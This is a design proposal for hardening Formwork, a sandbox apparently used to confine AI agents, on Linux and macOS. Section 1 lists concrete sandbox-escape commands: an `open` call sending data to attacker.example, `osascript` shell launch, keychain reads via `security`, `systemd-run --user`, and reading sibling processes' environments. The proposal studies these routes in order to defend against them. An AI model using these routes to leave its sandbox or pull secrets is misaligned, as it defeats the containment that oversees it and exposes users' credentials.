# FEP-5 (proposal): closing the sandbox gap with meta-harness sandboxes, on Linux and macOS

**Formwork Enhancement Proposal 5 — proposal, not landed.** Companion to `formwork.md` (design +
end-to-end spec), `constitution.md` (doctrine), `docs/fep-1.md` (host-scoped egress, which this FEP
builds on), and `docs/usability-review.md` / `docs/unstated-requirements.md` (the usability criteria
§9 applies). Motivated by `docs/omnigent-integration-eval.md`.

**Status.** Nothing here changes the landed spec or the constitution yet.
- New identifiers use draft numbering, written as inline code so the requirements canary skips them.
- Draft numbers start above the highest landed or drafted number: `FW-E2E-074` and `FW-ADV-015`
  landed; `FW-INV12` drafted in FEP-4; `FW-EGR6` and `FW-FID5` drafted in FEP-1; `FW-DISC7`–10
  reserved by FEP-4.
- Amendments to landed text are written as blocks to apply on landing (§7).

**Platform stance.** Each gap is closed on both backends, or the report states the difference.
- Every design section has a Linux and a macOS mechanism. §5 compares parity with one column per
  platform.
- Blueprint vocabulary is portable. No field value is a platform-specific name (§1.1). The same
  blueprint means the same thing on both backends ([FW-XR6](../formwork.md#fw-xr6)).
- A macOS claim not yet observed on Seatbelt is marked **(characterize)**. A CI test in the macOS
  characterization suite (§8) settles it before the requirement it supports is anchored.
- Nothing is reported `Enforced` from reasoning alone ([FW-INV5](../formwork.md#fw-inv5)).

---

## 1. Problem

Omnigent's OS sandbox, "OmniBox", has three parts:
- bubblewrap on Linux;
- `sandbox-exec` with `(deny default)` on macOS;
- a mandatory L7 egress proxy.

`docs/omnigent-integration-eval.md` compares it with Formwork. Each system covers much of what the
other lacks.

Formwork leads on the capability model:
- the credential floor under broad grants;
- the exec allowlist;
- tamper-vector write-subtract;
- the create/modify split;
- the FidelityReport, `explain` and `learn`;
- MCP shading.

The gaps, per platform:

| # | Gap | Omnigent Linux | Omnigent macOS | Formwork Linux today | Formwork macOS today |
|---|---|---|---|---|---|
| G1 | Mandatory egress, allowlisted by **host, method and path** | netns + proxy | SBPL allows `localhost:<relay>` only | `Deny` / `Ports` only | `Deny` / `Ports` only |
| G2 | **Credential injection**: the agent never holds the token | Proxy injects `Authorization` | Same | Deny or expose ([FW-CRED5](../formwork.md#fw-cred5)) | Same |
| G3 | **UDP** closed | Closed (netns) | Closed (`deny default`) | Open under `Ports`; the report doesn't say so | Closed (`deny network*`) |
| G4 | **Pathname AF_UNIX** (Docker, ssh-agent, session bus) | Not mounted, so unreachable | Denied except the relay | `connect()` unmediated | Closed except the resolver literal |
| G5 | **Process isolation**: other PIDs, `/proc`, IPC, private `/tmp` | Namespaces | `signal` / `process-info` limited to self; no namespaces | None; shared `/tmp` | None; shared `/tmp` and `$DARWIN_USER_TEMP_DIR` |
| G6 | **Privileged kernel interfaces** (IOKit, `mach-priv*`) | n/a (seccomp) | Not granted | seccomp baseline ([FW-ISO8](../formwork.md#fw-iso8)) | Allowed: `(allow default)` has no baseline |
| G7 | **Host-service channels**: a service outside the sandbox that runs code, opens URLs, or releases secrets for the confined process | Closed (private `$XDG_RUNTIME_DIR`, `DBUS_*` stripped) | AppleEvents/`lsopen` presumed closed **(characterize)**; all `mach-lookup` allowed | Open: session bus, `systemd --user`, X11/Wayland sockets (see G4) | Open: `appleevent-send`, `lsopen`, all `mach-lookup` |
| G8 | **Other processes' arguments and environment** | Hidden (PID ns) | `sysctl` `kern.procargs2` readable **(characterize)** | Open for same-uid processes: a confined process read a sibling's `/proc/<pid>/environ` and `cmdline` (verified; Landlock does not govern `ptrace_may_access`) | `kern.procargs2` returns same-uid **environments** **(characterize)** |

G7 is the largest gap. A confined process that can reach a host service acting on its behalf leaves
the sandbox without breaking anything.

On macOS, `(allow default)` permits:
- `open 'https://attacker.example/?d=…'`: LaunchServices starts the browser outside the sandbox, an
  egress bypass;
- `osascript … do script`: a shell outside the sandbox;
- `pbpaste`: the clipboard;
- `security find-generic-password -w`: keychain items that don't prompt.

On Linux, when a user session is running, an unmediated socket permits:
- `systemd-run --user`: a command outside the sandbox;
- `xdg-open`: the LaunchServices equivalent;
- the Secret Service: the keychain equivalent;
- the X11 or Wayland sockets: clipboard access and input injection.

Container and CI hosts usually run no user session, which is why the Linux evaluation did not see
this.

This FEP closes G1–G8 within the closed concept list:
- G1, G3 and G4 use one Linux mechanism, a `connect()` supervisor. It is the on-demand form of fd
  minting ([FW-GW6](../formwork.md#fw-gw6)). On macOS the same three are static SBPL rules.
- G2 extends the Catalog and the Gateway.
- G5 and G8 are an optional Confiner tier plus one default-on deny.
- G6 and G7 extend the anti-shedding baseline to both backends.

**Phasing.** Each phase lands independently, and the report is honest at every phase boundary.
- **Phase 0** — defects (§2). Two block the default profile on Linux; two make the macOS report
  over-claim.
- **Phase 1** — baselines that need no new transport: channels and privileged interfaces (§3.4),
  environment disclosure (§3.3, `FW-ISO16`), and their report lines.
- **Phase 2** — egress transport: the Linux supervisor, the macOS endpoint, UDP and resolver closure
  (§3.1).
- **Phase 3** — inspection and brokering (§3.2), which depend on Phase 2.
- **Phase 4** — the `isolate` tier (§3.3).
- Throughout — `explain`, `learn` and refusal messages (§3.5) land with the phase that introduces
  each denial kind.

### 1.1 Constraints this FEP holds to

- **No new concept.** The supervisor is the Gateway minting fds over the Seam. Brokering is the
  Catalog plus the Gateway. The isolation tier and the channel baseline are Confiner mechanism.
- **Kernel-first transport.** The confined process has no network path around the Gateway
  ([FW-XR7](../formwork.md#fw-xr7)). Proxy env vars help clients find the Gateway; they are never
  the enforcement.
- **Honesty.** Each new capability has a FidelityReport line per backend. A request the host cannot
  provide is refused before the workload starts ([FW-XR9](../formwork.md#fw-xr9)). A `Partial`
  verdict runs, with a report line and one operator-channel line naming the residual.
- **Portable vocabulary.** New blueprint values name *what* is granted — `clipboard`, `os-keyring`,
  `processes` — never *how* one platform implements it: no mach service names or socket paths in a
  blueprint. The compiler maps each value per backend.
- **Transparency ([FW-TRA2](../formwork.md#fw-tra2)).**
  - The macOS base stays `(allow default)`.
  - New default denies ship only after passing the toolchain gate and the agent-example gate
    (`FW-E2E-084`).
  - A deny that fails either gate moves to the `strict` profile, and the default reports it
    `Partial`.
- **Growth.** No new subcommand, and one new CLI flag (`--blueprint -`, for embedders). Three new
  blueprint fields, each justified in §6. TLS termination is opt-in per host.

---

## 2. Phase 0 — defects (bug fixes, no Concepts amendment)

| # | Platform | Defect | Violates | Proposed fix |
|---|---|---|---|---|
| D1 | Linux | `extends = ["builtin:default"]` fails at enforce time with `any-depth pattern **/.git/config cannot be a rooted Landlock rule`. `write-subtract` `**/` rows pass through the compiler unfiltered (`formwork-compile/src/lib.rs:440`); the floor's are withheld (`:432`). The README quickstart does not start on Linux. | [FW-INV5](../formwork.md#fw-inv5), [FW-XR6](../formwork.md#fw-xr6) | Withhold these rows the same way as the floor's. Report the tamper-vector set `Partial` with the reason. Add an E2E test that runs the README quickstart verbatim on both CI OSes; none does today. |
| D2 | Linux | `formwork explain $CWD/sub/.env` answers "denied (credential floor)", but the file is readable | [FW-INV5](../formwork.md#fw-inv5), [FW-FID6](../formwork.md#fw-fid6) | `explain` shows the per-host verdict ("withheld on this host") next to the model verdict |
| D3 | Linux | New files cannot be created in the project root. `protect_policy_inputs` write-denies `FORMWORK.toml` and its derived files, which splits the root. | [FW-TRA1](../formwork.md#fw-tra1) | Accept `.formwork/blueprint.toml` as a discovery location alongside `FORMWORK.toml` ([FW-BP8](../formwork.md#fw-bp8) walk unchanged otherwise). Keep derived files in `.formwork/`, so the protected hole is one directory and the root is not split. The files stay in the project, so learned grants can still be committed and shared. When the root is split, `run` and `explain` say so on Linux and name the `.formwork/` layout. Alternatives are in §8. |
| D4 | Linux | Under `Ports`, UDP is unrestricted, but the report says `net-default-deny enforced` | [FW-INV5](../formwork.md#fw-inv5) | Report `Partial: UDP unrestricted under the port tier` now. Phase 2 enforces it (`FW-ISO11`). |
| D5 | Linux | The CrossDomainSocket `Partial` reason omits that pathname `connect()` is unmediated, including the session bus and `systemd --user` (an escape, G7) | [FW-INV5](../formwork.md#fw-inv5) | Reword the reason and name the escape. The default env scrub strips `DBUS_SESSION_BUS_ADDRESS`, `DISPLAY` and `WAYLAND_DISPLAY`; this makes the sockets harder to find, not unreachable, so the verdict stays `Partial`. Phase 2 enforces (`FW-ISO12`). |
| D6 | both | The Gateway forwards non-JSON frames, JSON-RPC batch arrays, and id-less `tools/call` / `resources/read` / `prompts/get` unfiltered | [FW-GW2](../formwork.md#fw-gw2), [FW-GW4](../formwork.md#fw-gw4) | Non-JSON frame: close the connection. Batch arrays: refuse them (MCP 2025-06-18 removed batching). Gated methods: check policy whether or not they carry an `id`. Test: `FW-ADV-016`. |
| D7 | macOS | No report line for host-service channels or privileged interfaces | [FW-INV5](../formwork.md#fw-inv5), [FW-XR1](../formwork.md#fw-xr1) | Report both `Unenforceable` now. Phase 1 closes them (`FW-ISO13`, `FW-ISO14`). |
| D8 | macOS | The port tier's mDNSResponder literal is a DNS exfiltration channel, and the report doesn't list it | [FW-INV5](../formwork.md#fw-inv5) | Report it under the port tier. Drop the literal under `AllowHosts` (`FW-EGR12`). |
| D9 | Linux | `formwork.md` §9 describes Landlock scoping as blocking processes outside the domain, and this FEP's first draft repeated that `/proc/<pid>/environ` was blocked. A confined process read a same-uid sibling's `environ` and `cmdline` (verified). Scoping covers abstract sockets and signals only. | [FW-INV5](../formwork.md#fw-inv5), honesty is bidirectional (constitution Errors) | Add a report line `process-environment disclosure: Partial (same-uid readable)` on Linux, and correct the §9 prose (§7). Phase 1 adds the macOS deny and Phase 4 the Linux tier (`FW-ISO16`). |

---

## 3. Design

### 3.1 Egress transport (G1, G3, G4)

FEP-1 specifies what host-scoped egress permits. This section specifies how an unmodified HTTP
client reaches the Gateway. Each platform has to guarantee that the Gateway's endpoint is the only
endpoint the confined process can reach.

**Who runs the Gateway.** `formwork run` hosts the Gateway in-process whenever the blueprint's net
posture is `AllowHosts`. The user starts nothing extra. The launcher sets `HTTP(S)_PROXY`,
`NO_PROXY=` (empty) and the CA variables (§3.2). The existing `formwork gateway` subcommand stays
MCP-only.

Under `confine-self` no process sits outside the sandbox to host the Gateway, so `AllowHosts` is
refused before exec ([FW-XR9](../formwork.md#fw-xr9)). The error names the reason and the
alternative: drop `--confine-self` to use the spawn posture.

**Linux: seccomp user notification.**

Under `AllowHosts`, the Confiner installs a filter that returns `SECCOMP_RET_USER_NOTIF` for
`connect()` on AF_INET, AF_INET6 and AF_UNIX sockets. The listener fd goes to the spawning `formwork`
process — the supervisor, part of the Gateway — over the spawn socketpair.

For each notification, the supervisor:
1. copies the `sockaddr` and validates the notification id (`SECCOMP_IOCTL_NOTIF_ID_VALID`);
2. decides, using its copy;
3. if the decision is allow:
   - opens a TCP socket to the Gateway listener;
   - registers the socket's local port as an authenticated seam connection;
   - installs it in the target with `SECCOMP_IOCTL_NOTIF_ADDFD` + `SECCOMP_ADDFD_FLAG_SETFD`, and
     returns 0;
4. otherwise returns `EACCES` and emits a violation record ([FW-FID5](fep-1.md#fw-fid5)).

The kernel never re-reads the target's buffer, and the target never completes a connection, so the
pointer-argument TOCTOU of user notification does not apply.

The same filter:
- denies AF_INET/6 `SOCK_DGRAM` at `socket()`;
- denies `sendto`/`sendmsg` carrying an address on a stream socket (TCP Fast Open);
- delivers `sendto`/`sendmsg` carrying an address on an AF_UNIX datagram socket to the supervisor as
  well. Datagram unix sockets reach a path without `connect()` (`/dev/log` is the common case), so
  mediating `connect()` alone would leave that route open. The supervisor applies the §3.1.1 grant
  check to the address; a granted path is forwarded by the supervisor performing the send through a
  socket it holds, and an ungranted one returns `EACCES`.

For pathname AF_UNIX sockets (G4, G7), the supervisor:
1. resolves `sun_path` against the target's `/proc/<pid>/root` and `cwd`, opening it `O_PATH` on
   its own side;
2. allows the connection only if the socket is granted (§3.1.1) or was bound inside the session;
3. if allowed, connects through `/proc/self/fd/<n>` and injects the result.

The Gateway listener accepts only connections whose source port the supervisor registered. A
co-resident process is refused, which satisfies [FW-EGR6](fep-1.md#fw-egr6) with no proxy token.

Requirements and options:
- Linux 5.9 or later, which is below the Landlock ABI 4 floor (6.7) that the port tier already
  needs.
- An optional netns path: with unprivileged user namespaces and the isolation tier (§3.3), the
  session can instead get an `lo`-only network namespace with an in-namespace relay on the Seam.

**macOS: static SBPL and an authenticated local endpoint.**

- **Profile.** Keep `(deny network*)`, then re-allow exactly
  `(allow network-outbound (remote tcp "localhost:<P>"))` for this session's listener. SBPL remote
  filters accept only `*` or `localhost` as the host **(characterize)**, so the listener must
  authenticate connections itself.
- **Authentication, in two layers:**
  1. A per-session credential in `HTTP(S)_PROXY` (`http://fw:<nonce>@127.0.0.1:<P>`).
  2. A peer-process check. The Gateway maps the loopback 4-tuple to its owning PID
     (`proc_pidfdinfo` / `PROC_PIDFDSOCKETINFO`) and requires that PID to belong to the session. An
     unresolvable peer is refused.

  [FW-EGR6](fep-1.md#fw-egr6) is `Enforced` on macOS only if the peer check characterizes as
  reliable. Otherwise it is `Partial`, and the residual is named: a same-uid process that reads the
  agent's environment.
- **Other routes:**
  - UDP and pathname sockets are closed by `(deny network*)`, apart from granted literals.
  - Under `AllowHosts` the mDNSResponder literal is dropped. HTTP clients using a proxy don't
    resolve names locally, so every lookup happens in the Gateway, which pins it
    ([FW-ADV-008](fep-1.md#fw-adv-008)).
  - Handing a URL or a command to an unconfined process is closed by §3.4.
- **Violations.** Seatbelt denials reach [FW-FID5](fep-1.md#fw-fid5) through the unified-log tap
  after the fact, not synchronously. The report says so.

#### 3.1.1 Granting a unix socket

A session that needs a socket, for example `SSH_AUTH_SOCK` for a `git push` the operator wants,
names its path with the existing `allow` verb. `explain` shows the grant.
- **Linux:** the supervisor admits the socket.
- **macOS:** the compiler emits `(allow network-outbound (literal …))`.

Catalog-located sockets (ssh-agent) stay floor-denied unless excluded
([FW-CRED5](../formwork.md#fw-cred5)).

### 3.2 Inspection and credential brokering (G1 method/path, G2)

FEP-1 declared TLS interception and credential masking non-goals "unless a concrete requirement
demands" them. Two such requirements now exist:
- **Path-scoped writes.** For example, `POST api.github.com/repos/acme/**` and nothing else. CONNECT
  or SNI scoping lets any repo on that host be written.
- **Credential brokering.** This is `formwork.md` §11's open question, which the Catalog is now
  shaped to answer.

**Inspected hosts.** A host rule with `methods`, `paths`, or a brokered credential is inspected. For
such a host the Gateway:
- terminates TLS with a leaf certificate minted for the SNI;
- checks that the SNI, the `Host` header and the CONNECT target agree;
- canonicalizes the request (`FW-EGR11`) and matches it against the rule;
- re-originates the request upstream with the host trust store.

Plain host grants keep FEP-1's CONNECT/SNI grade, which is `Partial` per
[FW-EGR5](fep-1.md#fw-egr5).

Omnigent's matcher does not canonicalize. `/repos/acme/../other/x` matches `/repos/acme/**` there
(verified against `omnigent/inner/egress/rules.py`), and `FW-ADV-017` pins that case.

**CA and client trust.**
- **The CA.** Generated in memory per session; its key never touches disk. The certificate plus the
  host bundle is written read-only into the session scratch.
- **Client configuration.** The launcher points `SSL_CERT_FILE`, `NODE_EXTRA_CA_CERTS`,
  `REQUESTS_CA_BUNDLE`, `CURL_CA_BUNDLE`, `GIT_SSL_CAINFO` and `PIP_CERT` at that file.
- **Linux clients.** OpenSSL, BoringSSL, rustls-native-certs, Node, Python and Go all honor these
  variables.
- **macOS clients.** Security.framework clients ignore them: Go on darwin (so `gh`), Swift
  `URLSession`, and Apple tools. Against an inspected host they fail closed.
  - Installing the CA into the user's keychain search list would change trust host-wide, so that is
    excluded.
  - The per-host verdict reads `Enforced (env-trust clients); platform-verifier clients refused`.

**Diagnosing a refused client.** A client that rejects the session CA fails with an opaque error
such as `x509: certificate signed by unknown authority`. The Gateway observes the `unknown_ca` TLS
alert and emits one operator-channel line naming:
- the host;
- the likely cause: the client does not read `SSL_CERT_FILE`;
- on macOS, the Security.framework note;
- the options: drop inspection for that host, or use a client that honors the variable.

This is `FW-FID9`: a failure caused by Formwork is explained by Formwork, not left to the client's
error text.

**Brokering.**
- **Catalog.** Entries gain an optional `broker` block:
  - `hosts`: where the credential may be presented;
  - `scheme`: `bearer`, `basic` or `header:<name>` (Anthropic's `x-api-key`, which Omnigent's
    `Authorization`-only injector cannot express).
- **Blueprint.** `broker-credentials = ["anthropic"]`.
- **Effect.** The floor is unchanged: the variable is stripped and the file denied. The Gateway
  reads the source at session start, and again at a stated refresh interval.
- **Placeholder.**
  - The launcher sets the variable to `fwcred-<type>-<nonce>`, so clients that require it still
    start.
  - The Gateway substitutes the real credential in the scheme's header, only on requests to bound
    hosts.
  - The placeholder sent anywhere else is refused, with a violation record.
- **Compile-time check.** A brokered type makes its bound hosts inspected. A brokered type whose
  hosts are absent from the allowlist fails at compile, with a message that names the missing hosts
  (`FW-CRED12`).
- **macOS caveat.** When the typical client for a brokered type verifies through Security.framework,
  `explain` and the operator channel say so before the run (`github` / `gh`). The pre-run notice is
  the XR9-shaped part: the operator learns before the run, not from a TLS failure halfway through a
  session.
- **Out of scope.** Signing schemes (AWS SigV4, GCP JWT minting) and SSH agent brokering (§8).

**The minimal blueprint stays short.** The README-layer shape of this feature:

```toml
extends = ["builtin:default"]
rules = ["readwrite:$CWD/**"]
net = { hosts = ["api.anthropic.com"] }   # egress to this host only, via the gateway
broker-credentials = ["anthropic"]        # the agent sees a placeholder, never the key
```

### 3.3 Process isolation (G5, G8)

**Default-on for both backends (`FW-ISO16`): other processes' environments are unreadable where the
platform can express it, and reported where it cannot.** Environment disclosure is a
credential-disclosure path, so this is not part of the opt-in tier.
- **macOS:** the default profile denies `sysctl-read` of `kern.procargs2` **(characterize)**. On
  macOS this call returns the full environment of same-uid processes.
- **Linux:** a confined process can read a same-uid sibling's `/proc/<pid>/environ` and `cmdline`
  today (verified on this host under `ambient-minus-subtract`). Access to those files is decided by
  `ptrace_may_access`, which Landlock does not govern, and a Landlock deny on `/proc/<pid>` cannot be
  written for "every pid but the caller's": a rule is bound to one inode at spawn, while each
  descendant's `/proc/self` resolves to a different directory. The honest verdicts are:
  - `Partial` in the default profile, with the residual named ("same-uid process environments are
    readable");
  - `Enforced` under `isolate = ["processes"]`, where the fresh `procfs` in the PID namespace lists
    only session processes;
  - `Enforced` when stacked under an outer PID namespace (Omnigent's bwrap).

  The report line and one operator-channel line state this on every Linux run without the tier.

**Opt-in tier: `isolate`.** It is opt-in because it changes what `ps`, debuggers and IDE bridges
see. It has three portable members.

| Member | Linux | macOS |
|---|---|---|
| `processes`: other processes are not visible, signalable or inspectable, including their arguments | user + PID namespaces with a fresh `/proc` (plus UTS); a minimal Formwork init as PID 1. `Enforced` where user namespaces exist | `(deny process-info* (target others))`, `(deny signal (target others))` with session re-allows **(characterize)**, and `sysctl-read` denies on the process-enumeration MIBs. `Enforced` or `Partial` per characterization |
| `ipc`: SysV/POSIX IPC confined to the session | IPC namespace. `Enforced` where user namespaces exist | `ipc-sysv-*` denied; POSIX names restricted to a session prefix **(characterize)**. `Partial` (POSIX names are global) |
| `tmp`: a private temporary directory | tmpfs on `/tmp` in a mount namespace (`Enforced`); otherwise the directory form (`Partial`) | directory form only (`Partial`) |

**Namespace setup order (Linux).** User, PID, IPC, UTS and mount namespaces are created before
Landlock and seccomp are installed. After that, the seccomp baseline still denies `CLONE_NEWUSER`
and the mount family ([FW-ISO8](../formwork.md#fw-iso8)).

**The directory form of `tmp`.** Both platforms support it.
- The launcher creates a per-session directory, points `TMPDIR`, `TMP` and `TEMP` at it, and grants
  writes there instead of to the shared locations:
  - `/tmp/**` on both platforms;
  - `/private/tmp/**` and `$DARWIN_USER_TEMP_DIR/**` on macOS.
- Tools that hardcode `/tmp`, or on macOS call `confstr(_CS_DARWIN_USER_TEMP_DIR)`, fail loudly
  instead of sharing.
- Resolved-input disclosure: the per-session directory is named in `explain` output and on the
  operator channel ([FW-FID7](../formwork.md#fw-fid7)).

**Verdicts.**
- A member the host cannot provide at all — `processes` or `ipc` on Linux without user namespaces —
  is refused before spawn ([FW-XR9](../formwork.md#fw-xr9)). The refusal names the reason and the
  alternative, for example "this host restricts unprivileged user namespaces (AppArmor); run inside
  bwrap or drop `processes`".
- A member the host provides only `Partial` runs, and prints one operator-channel line naming the
  residual.

**Stacked under Omnigent's bwrap** (evaluation Option B), the outer layer provides this, and the
blueprint leaves `isolate` unset.

### 3.4 Host-service channels and privileged interfaces (G6, G7)

The anti-shedding baseline ([FW-ISO8](../formwork.md#fw-iso8)) extends to both backends and to
services that act on the process's behalf. It is on in every blueprint.

A channel is lifted in one of two ways:
- by name, in a new `channels` field whose values are a closed, portable enum;
- through the Catalog's typed exclusion, when the channel is a credential store.

| Portable name | Lifted by | macOS mechanism (SBPL deny) | Linux mechanism |
|---|---|---|---|
| `run-outside` | `channels` | `appleevent-send`; `mach-lookup` of launchd job submission and the AppleEvent server **(characterize: names)** | supervisor denies the session-bus and `systemd --user` sockets; `DBUS_*` stripped |
| `open-url` | `channels` | `lsopen`; `mach-lookup` of `launchservicesd` / `lsd.*` **(characterize)** | session bus (portal, `xdg-open`) |
| `clipboard` | `channels` | `mach-lookup` `com.apple.pasteboard.*` | X11/Wayland sockets; abstract X11 is already scoped by Landlock ABI 6 |
| `screen` | `channels` | `mach-lookup` of WindowServer/screencapture services **(characterize)** | X11/Wayland sockets |
| `camera`, `microphone` | `channels` | `iokit-open` of those classes; `mach-lookup` `com.apple.cmio.*` / `com.apple.audio.*` | `/dev/video*`, `/dev/snd/*` denied by default subtract |
| `os-keyring` | `allow-credentials` (a Catalog type) | `mach-lookup` of `securityd` / `SecurityServer` **(characterize)** | session bus `org.freedesktop.secrets`; `$XDG_RUNTIME_DIR/keyring/*` |
| (none) | — | `mach-priv-host-port`, `mach-priv-task-port`; `iokit-open` outside the shipped allowlist | seccomp (unchanged) |

- **TCC.** macOS attributes a child's privacy-sensitive access to the responsible app (the terminal
  or IDE). The camera, screen and input rows stop a confined agent from using TCC grants the user
  gave that app.
- **Keychain granularity.** Seatbelt gates the keychain as one service, not per item. Lifting
  `os-keyring` therefore opens every keychain item that does not prompt. It also lets the agent
  *trigger* keychain prompts, which the user sees as system dialogs.
  - The `explain` and report lines state both effects.
  - A narrower lift is not available on macOS. §8 records the options.
- **The agent examples cut across the baseline, and the design addresses it rather than finding out
  in the field.**
  - Claude Code on macOS stores its OAuth credential in the keychain **(characterize: item name)**
    and opens a browser to log in. `gh auth login --web` opens one too.
  - The `claude` Catalog type therefore gains a macOS location, the keychain service. This makes
    `allow-credentials = ["claude"]` lift `os-keyring` on macOS, with the granularity note in the
    report.
  - The Claude Code example documents `channels = ["open-url"]` for the login step only, as a
    separate blueprint layer or a `--set` override, not a standing grant.
  - `FW-E2E-084` runs each shipped agent example on macOS CI with the baseline on.

### 3.5 Operator experience (usability criteria: explainability, defaults, CLI simplicity)

The mechanisms above add four new kinds of denial: host, request, channel and supervised socket.
Each one is explainable with the tools the operator already uses, and discoverable through `learn`.

- **`explain` takes the new kinds as positional arguments, typed by shape** ([FW-FID6](../formwork.md#fw-fid6)
  extended; no new subcommand):
  - `formwork explain https://api.github.com/repos/acme/x` gives the host-rule verdict, the method
    and path match, and the deciding rule with its provenance;
  - `formwork explain clipboard` gives the channel verdict and its lift;
  - `formwork explain /run/user/1000/bus` gives the socket verdict (Linux).

  Typing by shape means: a value with `scheme://` is a URL, a member of the channel enum is a
  channel, and anything else is a path.
- **`learn` proposes hosts and channels** (`FW-DISC12`). Two new denial sources reverse-compile into
  proposal entries, which go through the existing list/accept loop
  ([FW-DISC11](../formwork.md#fw-disc11)):
  - Gateway egress violations become `net.hosts` entries, with methods and paths when inspected;
  - channel denials become `channels` entries. The source on Linux is supervisor violations; on
    macOS it is unified-log `mach-lookup`/`lsopen`/`appleevent-send` denials, mapped back to the
    portable name.

  Some denials are withheld and never proposed, following the floor rule
  ([FW-DISC3](../formwork.md#fw-disc3)): metadata and private IPs ([FW-EGR4](fep-1.md#fw-egr4)),
  and `os-keyring`. The withheld items are itemized to the operator with the typed lift.

  `formwork learn -- claude` becomes the way to find the hosts an agent needs, instead of reading
  vendor documentation.
- **Refusals explain themselves at the point of use** (`FW-FID9`):
  - A Gateway refusal returns HTTP 403 with a one-line body naming the host or rule and the
    `formwork explain <url>` command.
  - A supervised `connect()` refusal gets `EACCES` plus one operator-channel line with the
    destination and the `explain` command.
  - A TLS client that rejects the session CA gets the §3.2 diagnosis.
- **Resolved-input disclosure** ([FW-FID7](../formwork.md#fw-fid7)). `compile` and `explain` output
  names every value this FEP auto-chooses:
  - the Gateway listener endpoint;
  - the session CA path;
  - the per-session temp directory;
  - the `.formwork/` layout when discovered (D3).

  Placeholders are named by type, never by value.
- **Exit codes** (`FW-XR10`; mints `docs/unstated-requirements.md` item 12, which an embedder now
  needs). `run` keeps exiting with the workload's status. A Formwork failure after spawn exits `125`
  and prints a result-channel line saying the failure was Formwork's. Examples: the Gateway dying,
  or the supervisor losing its listener. Omnigent-style launchers can then tell "the agent failed"
  from "the sandbox failed". `125` is the value `git` and `docker` use for the same purpose. A
  workload that itself exits `125` is indistinguishable by code alone, so the attribution line is
  the contract and the code is the convenience.
- **Embedding.**
  - `--blueprint -` reads the blueprint from stdin, so generated blueprints need no temp file. The
    source is disclosed as `stdin` ([FW-FID7](../formwork.md#fw-fid7)).
  - Releases also publish platform wheels carrying the signed binary, following the `ruff` and `uv`
    pattern, so a Python orchestrator can depend on Formwork directly.

### 3.6 What stays asymmetric (reported, never hidden)

| Property | Linux | macOS | Why |
|---|---|---|---|
| Violation latency | Synchronous per `connect()` | Post-hoc (unified log) | Seatbelt has no notification channel |
| Egress endpoint authentication | By construction | Credential + peer-PID check | SBPL cannot scope `localhost` to a session |
| TLS inspection clients | All env-trust clients | Excludes Security.framework clients | No per-process trust on macOS |
| Keychain lift granularity | Per bus name (Secret Service as a whole) | Whole keychain channel | Seatbelt gates `securityd` as one service |
| Other processes' environment | `Partial` without `isolate` | `Enforced` (sysctl deny) | `ptrace_may_access` is outside Landlock's scope |
| Any-depth `**/` rows | `Partial` | `Enforced` | Landlock cannot root them |
| stat on denied paths | `Partial` | `Enforced` | kernel mechanism |
| `isolate` `processes` / `ipc` | `Enforced` where user namespaces exist | `Partial` or `Enforced` per characterization | no namespaces on macOS |
| `isolate` `tmp` | tmpfs, or directory form | directory form | no mount namespace on macOS |
| ENOENT invisibility | Not provided | Not provided | `formwork.md` §3 non-goal |
| Enforcement API | stable kernel ABI | `sandbox_init` (deprecated, still shipped) | §8 |

---

## 4. Proposed requirements (draft numbering — anchored on landing)

These continue existing families: EGR, ISO, CRED, FID, DISC and XR.

| Req | Requirement |
|---|---|
| `FW-EGR7` **Supervised connect (Linux)** | Under the host-allowlist posture on Linux, the Confiner shall deliver every `connect()` on AF_INET, AF_INET6 and AF_UNIX sockets to a supervisor outside the sandbox. The supervisor shall perform any allowed connection itself and install the result in the target, so that no confined process completes a `connect()` of its own. |
| `FW-EGR8` **Sole egress endpoint (macOS)** | Under the host-allowlist posture on macOS, the compiled profile shall permit outbound network only to `localhost:<P>` for the session's Gateway listener and to pathname sockets granted by `allow`. |
| `FW-EGR9` **Registered egress** | The Gateway egress listener shall accept a connection only if its source endpoint was registered by the supervisor (Linux), or if it presents the session credential and its peer PID belongs to the session (macOS). |
| `FW-EGR10` **Inspected host rule** | For a host rule naming `methods`, `paths` or a brokered credential, the Gateway shall terminate TLS, verify that the SNI, the `Host` header and the CONNECT target agree, and admit a request only if its method and canonicalized path match the rule. |
| `FW-EGR11` **Request canonicalization** | Before matching, the Gateway shall remove dot-segments and decode percent-encoded unreserved characters. It shall reject a request with an encoded `/`, a NUL, a backslash in the path, or both `Content-Length` and `Transfer-Encoding`. |
| `FW-EGR12` **Resolver closure** | Under the host-allowlist posture, the Confiner shall deny every local name-resolution path: UDP and the resolver sockets on Linux, and the mDNSResponder literal on macOS. |
| `FW-EGR13` **Ephemeral CA** | The Gateway shall generate the inspection CA in memory per session. It shall not write the CA private key to any file, nor expose it to any confined process. |
| `FW-EGR14` **Gateway hosting** | `formwork run` in the spawn posture shall host the Gateway whenever the net posture is host-allowlist. Under `confine-self` with that posture, it shall refuse before exec, naming the spawn posture as the alternative. |
| `FW-CRED10` **Brokered credential** | For each type in `broker-credentials`, the Launcher and the Confiner shall strip and deny the type's locations exactly as for an unlisted type ([FW-CRED4](../formwork.md#fw-cred4)). The Gateway shall hold the credential outside the sandbox. |
| `FW-CRED11` **Placeholder binding** | When a brokered type has an env var, the Launcher shall set it to a per-session placeholder. The Gateway shall substitute the credential only in requests to that type's bound hosts, and refuse, with a violation record, any request carrying the placeholder elsewhere. |
| `FW-CRED12` **Broker host closure** | The compiler shall reject a blueprint that brokers a type whose bound hosts are absent from the host allowlist, naming the missing hosts. |
| `FW-CRED13` **Service-located credentials** | The Catalog shall express credential locations that are services (macOS mach names, Linux bus names and sockets). It shall ship the `os-keyring` type, floor-denied by default, and map the `claude` type's macOS location to the keychain. |
| `FW-ISO10` **Isolation tier** | When a blueprint requests `isolate`, the Confiner shall apply each member (`processes`, `ipc`, `tmp`) using the §3.3 mechanism for the platform. It shall refuse before spawn any member the host cannot provide, and print one operator-channel line for each member it provides as `Partial`. |
| `FW-ISO11` **UDP closure (Linux)** | Under the host-allowlist posture, the Confiner shall deny AF_INET and AF_INET6 `SOCK_DGRAM` socket creation. Under the port posture, the FidelityReport shall mark UDP unrestricted. |
| `FW-ISO12` **Pathname socket mediation (Linux)** | Under supervised connect, the supervisor shall refuse `connect()`, and `sendto`/`sendmsg` with an address, to a pathname AF_UNIX socket unless it is granted by `allow` or was bound by a process in the session. |
